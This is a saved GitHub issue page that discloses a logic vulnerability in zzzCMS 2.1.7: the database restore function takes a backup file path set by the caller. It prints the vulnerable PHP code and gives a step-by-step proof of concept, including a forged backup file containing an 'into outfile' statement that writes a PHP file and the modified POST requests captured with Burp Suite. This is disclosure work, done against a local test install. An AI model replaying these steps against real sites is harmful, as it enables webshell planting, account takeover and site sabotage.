=== Content from github.com_8948c67b_20250114_225423.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyhy217%2Fzzzcms-vul%2Fissues%2F1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyhy217%2Fzzzcms-vul%2Fissues%2F1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=yhy217%2Fzzzcms-vul)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yhy217](/yhy217)
/
**[zzzcms-vul](/yhy217/zzzcms-vul)**
Public

* [Notifications](/login?return_to=%2Fyhy217%2Fzzzcms-vul) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fyhy217%2Fzzzcms-vul)
* [Star
   0](/login?return_to=%2Fyhy217%2Fzzzcms-vul)

* [Code](/yhy217/zzzcms-vul)
* [Issues
  1](/yhy217/zzzcms-vul/issues)
* [Pull requests
  0](/yhy217/zzzcms-vul/pulls)
* [Actions](/yhy217/zzzcms-vul/actions)
* [Projects
  0](/yhy217/zzzcms-vul/projects)
* [Security](/yhy217/zzzcms-vul/security)
* [Insights](/yhy217/zzzcms-vul/pulse)

Additional navigation options

* [Code](/yhy217/zzzcms-vul)
* [Issues](/yhy217/zzzcms-vul/issues)
* [Pull requests](/yhy217/zzzcms-vul/pulls)
* [Actions](/yhy217/zzzcms-vul/actions)
* [Projects](/yhy217/zzzcms-vul/projects)
* [Security](/yhy217/zzzcms-vul/security)
* [Insights](/yhy217/zzzcms-vul/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fyhy217%2Fzzzcms-vul%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fyhy217%2Fzzzcms-vul%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# logic vulnerability exists in zzzcms #1

Open

[yhy217](/yhy217) opened this issue
Sep 19, 2023
· 0 comments

Open

# [logic vulnerability exists in zzzcms](#top) #1

[yhy217](/yhy217) opened this issue
Sep 19, 2023
· 0 comments

## Comments

[![@yhy217](https://avatars.githubusercontent.com/u/128808033?s=80&v=4)](/yhy217)

Copy link

Owner

### **[yhy217](/yhy217)** commented [Sep 19, 2023](#issue-1902018207) • edited Loading

| The zzzcms system is a free, open source website building system in PHP language. It adopts an MVC-like structure, has a simple framework and is easy to learn. Born in 2016, its original design was to allow users to build their own websites quickly and conveniently. The system is developed using PHP language and supports multiple content management systems. Compared with other content management systems, ZZZCMS is characterized by its simple operation, easy to use, and good scalability and security.  [suggested description] Zzzcms has a logical flaw. The backup file path when restoring the database backup file is controllable, and you can upload your own forged malicious database backup file. As a result, attackers can use this vulnerability to modify the passwords of other users without permission, destroy the site database structure, and even cause the site to crash. Or even Use sql statements to create php Trojans when knowing the physical path, resulting in getshell  [Vulnerability Type] logic vulnerability  [Vendor of Product] <http://zzzcms.com/index.html>  [Affected Product Code Base] zzzCMS Dev.2.1.7  [Affected Component] file:/admin/save.php affected function:restore()  ``` function restore(){ 	$conf=_SERVER('conf'); 	$path=safe_url(getform('path','post')); 	$backpath=DOC_DIR.$path;	 	$username=get_cookie('adminname'); 	$time= date('Y-m-d h:i:s',time()); 	$ip=ip();	 	str_log('数据库还原,原路径'.$path.'备份路径:'.$backpath.'管理员:'.$username.'时间：'.$time.'IP:'.$ip,'data'); 	switch ($conf['db']['type']) {	 	case 'sqlite':	 		$name=randname().'.db';	 		$datapath=SITE_DIR.$conf['db']['sqlitepath'].$name;	 		if (file_backup($backpath,$datapath)){ 	           echo save_config(array('sqlitename'=>$name)); 	        }else{ 	           echo 0; 	        } 		break; 	case 'mysql': 		 if (is_file($backpath)) {              $sql = load_file($backpath);   		   $data = explode(';'.PHP_EOL, $sql); 			foreach ($data as $value) { 				if ($value){					 				echo db_exec($value); 				} 			}              }  		break; 	} 	 }  ```  [Attack Type] Remote  [Impact] Code Execution  [Cause of vulnerability] There is a function restore() for database restoration in /admin/save.php [image](https://private-user-images.githubusercontent.com/128808033/268826055-893be1c1-6f6c-4258-bd39-07b31f908ff3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODI2MDU1LTg5M2JlMWMxLTZmNmMtNDI1OC1iZDM5LTA3YjMxZjkwOGZmMy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iNDEyMGViYjhiMGM5MDkwNDVmN2UyOWFiZmNkOWM2YmU2YzVjMTRmOGJiMzY4NTY5ZDA3ZmNiZGY0MzJiMWI3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.vpiV3RKOrvMqNiqQn7urzDhEb-u3zGI1kdx7t4baQCM)   1. In the above code, $path is passed in through the post method and is controllable, while safe\_url only performs some basic filtering and is not strict. The $backpath below is spliced using $path. When using the mysql database, extract the SQL creation statements of the database backup file under the $backpath path, and execute these SQL statements in the following execution function. In this process, the restored database backup file path $backpath is controllable. 2. This cms system allows us to set a whitelist for the allowed uploading files. Then add bak to the image whitelist so that we can upload our forged database files.  [image](https://private-user-images.githubusercontent.com/128808033/268826326-2b839b2f-b566-4a03-a3f8-a218049c12b2.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODI2MzI2LTJiODM5YjJmLWI1NjYtNGEwMy1hM2Y4LWEyMTgwNDljMTJiMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hZDYxOGVhNTBlNGM1OTM0OWEwNGY5NTZhOTA0NTg0YmMyMzkyZmEwMWYxNGQ3ZmJkYTgzY2NlZTU0MTdlMDhlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.bGWqP84_TkeXtR834N2uFueB_sEK3SBl1j64WSFgqFI) 3. So we considered using the self-constructed database backup file we uploaded to restore, and changed $backpath to the path of the database backup file we uploaded. So in the data package for restoring the database, change the value of path to %2Fadmin%2Fbackup%2F1694764390.bak (the path of the uploaded database backup file) This logic vulnerability allows the website to use the malicious database backup file we constructed when restoring the database. This malicious database backup file can use SQL statements to modify the passwords of other users without permission, destroy the site database structure and cause the site to be paralyzed. We can even write sql statement to create a php Trojan causing getshell in the malicious database backup file we constructed when physical path is known.  [Vulnerability demonstration] This cms can use sqlite database and mysql database. Here we take the widely used mysql database as an example. 1.choose mysql database when installing,and use the route /admin/ as the website backend. [image](https://private-user-images.githubusercontent.com/128808033/268819916-f3ee7f6c-283d-4eeb-a59a-6299e6d3c9d9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODE5OTE2LWYzZWU3ZjZjLTI4M2QtNGVlYi1hNTlhLTYyOTllNmQzYzlkOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05Y2U2ZmY0M2UzMmQ5ZjMyNjkwMzFkMTg3MDk3Nzk2NTY4ZjM5NGQxMzhhYmMwZTNlNTU1YzQ1NTViMDBlZDgwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.LC0ZaiLoSE_6YhqKDeV_H6RKDwtXFBD0uRymZbzeArI)  2.After the installation is complete, click the Backup Database button on the database backup page <http://localhost:8089/admin/?act=datebackuplist> [image](https://private-user-images.githubusercontent.com/128808033/268820121-fef97630-37b6-4f3c-9066-18d2eaf57402.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIwMTIxLWZlZjk3NjMwLTM3YjYtNGYzYy05MDY2LTE4ZDJlYWY1NzQwMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kNWExOTk3YTc1NGM2ZGY5ZGZhMjdmN2M2ODMxOTk4NGIyZjM1NWEyMzc5NWEzMTgwNTU1MTM0ODdiNjI0NmUxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.SoqYrpzvGeqigw0lDLg1Lm4y1JF6iT8mQcuNE3OWzX0)  4.After the backup is complete, it is found that the path to the backup file is displayed:"/admin/backup/1694772751.bak" [image](https://private-user-images.githubusercontent.com/128808033/268820695-fea77050-e3db-4871-ad43-e8bb7c7ffab3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIwNjk1LWZlYTc3MDUwLWUzZGItNDg3MS1hZDQzLWU4YmI3YzdmZmFiMy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04ODY0ODc0NTNiNjA5NmRkZjQ5NGQzOGQxM2ZkNDNkMzI5MDU1NDUwMWRlOTBkNDRjZmRjMTM0OWEyZDkwZDk0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.gM-GG7FE8Hsjbd8yRnsapaUYFVl0fmlpg6H6uCGPaFU)  5.access the databaseback with the path displayed in step 3 view-source:<http://localhost:8089/admin/backup/1694772751.bak> Found the sql statement to create the whole database [image](https://private-user-images.githubusercontent.com/128808033/268821900-0745bf0f-77a6-4931-87fd-4ca4dc59e330.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIxOTAwLTA3NDViZjBmLTc3YTYtNDkzMS04N2ZkLTRjYTRkYzU5ZTMzMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNDZjMWJkODQ1NDIyYmE1ZTAyYjQ3MTJkYTFkNzc1YThjZThjYjNiNjE3MjM4ZDYzYjA5OTVlMTgwOTk4ODlhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.MmcyDQhvNrX_vXf1Y2le3GrtVh2jeiNyvt-3AfT5e2I)  6.Copy these table creation statements to recreate hacker.bak, and write statement 'select "" into outfile "D:/phpstudy\_pro/WWW/zzzphp (2 )/admin/hack.php";' in hacker.bak [image](https://private-user-images.githubusercontent.com/128808033/268822572-2a3b1094-6c7b-42f5-8273-3d6d0cddf4d4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIyNTcyLTJhM2IxMDk0LTZjN2ItNDJmNS04MjczLTNkNmQwY2RkZjRkNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jZjNkYmRhMTMyY2JjMGRhYzUzNjkzODVmZWJkNWM4MTVmNzJjZTNmYzM2NmE2Mzg0YmY3YmI2N2Q2NGNhYTIzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.cCVY1gOkte8QOH1liEZV0jc_HMHbtoTlHTExRiTh-gk)  7.Then, change the file upload restrictions at localhost:8089/admin/?act=uploadset and add the allowed suffix bak to ensure that hacker.bak can be uploaded to the server. [image](https://private-user-images.githubusercontent.com/128808033/268823240-d27dd35d-2687-4bba-9b43-07020fff95bc.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIzMjQwLWQyN2RkMzVkLTI2ODctNGJiYS05YjQzLTA3MDIwZmZmOTViYy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mNDE1MTI4ZTIyNzMxYzEzYTkxZGY4ZTBjY2FiN2E0Njc0MjIxMzc2NDJhOWRlMDRmOTc0ZWUwOGIzMzhlYzE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.71O_eyEu-oTneY4nKmtf_GWgdscrwVNT-ALz4qI__eI)  8.After saving the upload settings, click the edit button at the column editing location localhost:8089/admin/?act=sortlist to edit the column to upload hacker.bak [image](https://private-user-images.githubusercontent.com/128808033/268823478-2adc7c0c-7130-4d54-9b42-05d5f7291adc.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODIzNDc4LTJhZGM3YzBjLTcxMzAtNGQ1NC05YjQyLTA1ZDVmNzI5MWFkYy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jZmEwNTZjOGE3ODVjZjNkNTljYTRhZDEyZTBkYjAxOWQ0NTAxMjI5NDJmODdjMDY1YzZmZGJmYzNmMDYxNzU4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.GiRM5j5QZPym3od6cL5YMHM25Ap8g-OI-swVpp8zTXs)  9.It is able to upload the hacker.php in "栏目大图",and display the uploaded file path /upload/sort/1694774144356368.bak when finishing uploading. [image](https://private-user-images.githubusercontent.com/128808033/268824085-3d3e27ce-bfd7-4474-b1d7-9034bbe8ab56.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODI0MDg1LTNkM2UyN2NlLWJmZDctNDQ3NC1iMWQ3LTkwMzRiYmU4YWI1Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wMGU5MTQwMWViMGE1YWJkMDIwYmVmNGJlNDIwMDZjZDdiNTJiNmZmYzVkMmFkZDYwMDM4MTQ3ZTM5MzViNTMzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.kKeijK-YR4hOJsVJjS6b_sUeu0t_ED8XJoywfB06IBM) click save button  10.Then visit the database backup page localhost:8089/admin/?act=datebackuplist, select a backup file, click to restore the database, and capture the data package with burpsuite. [image](https://private-user-images.githubusercontent.com/128808033/268824556-eaa6e4fa-27a9-45e2-9026-c24e5dc13916.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODI0NTU2LWVhYTZlNGZhLTI3YTktNDVlMi05MDI2LWMyNGU1ZGMxMzkxNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jNWE0OGNiZThkOTQ2ZDM1NGJhMjdiMTA0NjI4YWM1YzA2YTk2ZDUxOTZiYzQ2NmQwMjQ5Zjg3MDY2NDQxNWE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.TAiZDgm-422C3VT1UcOTNigDE95pbj7Jwd1gBbDNrto)  the captured data package:  ``` POST /admin/save.php?act=restore HTTP/1.1 Host: localhost:8089 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 39 Origin: http://localhost:8089 Connection: close Referer: http://localhost:8089/admin/?act=datebackuplist Cookie: zzz389_adminpass=1; PHPSESSID=jfk2mts7unak1qa31fildvupl7; zzz811_token=d7be3baac1ee456de001dc36f50e795f; zzz863_adminpass=0; zzz863_adminname=admin; zzz863_admintime=1694772452; zzz863_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz811_upload=[{"url":"/upload/sort/1694774144356368.bak","title":"hacker.bak"}] Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  path=%2Fadmin%2Fbackup%2F1694772751.bak  ```  11. Change the value of path to the URL encoding of the path to the backup file that we tampered with     %2fupload%2fsort%2f1694774144356368.bak   the final data package  ``` POST /admin/save.php?act=restore HTTP/1.1 Host: localhost:8089 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 39 Origin: http://localhost:8089 Connection: close Referer: http://localhost:8089/admin/?act=datebackuplist Cookie: zzz389_adminpass=1; PHPSESSID=jfk2mts7unak1qa31fildvupl7; zzz811_token=d7be3baac1ee456de001dc36f50e795f; zzz863_adminpass=0; zzz863_adminname=admin; zzz863_admintime=1694772452; zzz863_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz811_upload=[{"url":"/upload/sort/1694774144356368.bak","title":"hacker.bak"}] Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  path=%2fupload%2fsort%2f1694774144356368.bak  ```  12.Access the path <http://localhost:8089/admin/hack.php>, and indeed execute the test content in hack.php. Using the same idea, the attacker can use the tampered database backup The file exceeds the authority to tamper with the passwords of other users, or uses a damaged database backup file to paralyze the site, or even writes the statement getshell to create a Trojan horse file in the forged database backup file. [image](https://private-user-images.githubusercontent.com/128808033/268825566-a2a7ffa3-b44f-49f4-ae39-49d3ab8e0ed5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTU1NjIsIm5iZiI6MTczNjg5NTI2MiwicGF0aCI6Ii8xMjg4MDgwMzMvMjY4ODI1NTY2LWEyYTdmZmEzLWI0NGYtNDlmNC1hZTM5LTQ5ZDNhYjhlMGVkNS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjU0MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05MDQxODc4M2E2ZDRmM2JjYTAwZjk0NTkyYWRkOTVkYjFlNTBmY2RkY2ViZjM1YmEzZjQxM2NjMGQ0Y2E1MjE1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.2tNLVSJS3AOYPhWcNBgcN-xtll36lmbzqYveaFwCu6w) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fyhy217%2Fzzzcms-vul%2Fissues%2F1)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@yhy217](https://avatars.githubusercontent.com/u/128808033?s=52&v=4)](/yhy217)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


